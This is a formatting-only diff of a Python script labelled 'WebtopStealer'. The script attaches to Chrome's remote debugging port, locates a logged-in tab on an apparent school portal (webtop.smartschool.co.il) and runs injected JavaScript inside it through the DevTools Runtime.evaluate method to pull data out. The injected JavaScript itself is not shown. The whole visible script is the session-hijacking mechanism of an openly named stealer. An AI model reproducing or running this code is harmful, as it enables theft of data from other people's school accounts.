@@ -8,12 +8,14 @@ import websocket
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger("WebtopStealer")
 
+
 def get_webtop_tab():
     resp = requests.get("http://localhost:9222/json")
     for t in resp.json():
-        if "webtop.smartschool.co.il" in t.get('url', ''):
+        if "webtop.smartschool.co.il" in t.get("url", ""):
             return t
     return None
+
 
 def main():
     tab = get_webtop_tab()
@@ -21,7 +23,7 @@ def main():
         print("❌ Webtop tab not found!")
         return
 
-    ws_url = tab.get('webSocketDebuggerUrl')
+    ws_url = tab.get("webSocketDebuggerUrl")
     try:
         ws = websocket.create_connection(ws_url)
 
@@ -48,11 +50,11 @@ def main():
         })()
         """
 
-        ws.send(json.dumps({
-            "id": 1,
-            "method": "Runtime.evaluate",
-            "params": {"expression": js_code, "returnByValue": True}
-        }))
+        ws.send(
+            json.dumps(
+                {"id": 1, "method": "Runtime.evaluate", "params": {"expression": js_code, "returnByValue": True}}
+            )
+        )
 
         res = json.loads(ws.recv())
         ws.close()
@@ -69,6 +71,7 @@ def main():
 
     except Exception as e:
         print(f"❌ Error: {e}")
+
 
 if __name__ == "__main__":
     main()
